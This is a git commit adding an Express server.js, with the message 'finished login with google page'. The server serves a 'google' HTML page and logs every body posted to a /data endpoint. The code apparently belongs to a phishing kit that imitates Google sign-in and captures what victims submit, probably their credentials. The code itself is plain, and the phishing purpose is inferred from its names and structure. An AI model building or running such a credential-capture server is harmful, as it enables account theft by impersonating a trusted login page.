2a115d215e030bd6185820aa9438fa8588e541c2
Shubham Patil <shubhampatilsd@gmail.com>
2021-07-01 11:26:33 -0700

    finished login with google page

---
+++ server.js
@@ -0,0 +1,27 @@
+const express = require('express')
+const path = require('path')
+const bodyParser = require('body-parser');
+
+const app = express();
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+switch(process.argv[2]){
+    case "google":
+        app.get('/', (req,res)=>{
+            res.sendFile(path.join(__dirname,'/pages/',"google", `google.html`))
+        })
+        break; 
+}
+
+
+
+app.post("/data", (req,res)=>{
+    console.log(req.body)
+    res.send("")
+})
+
+const PORT = process.env.PORT || 5000
+
+app.listen(PORT, ()=>console.log(`Listening on port 5000`))
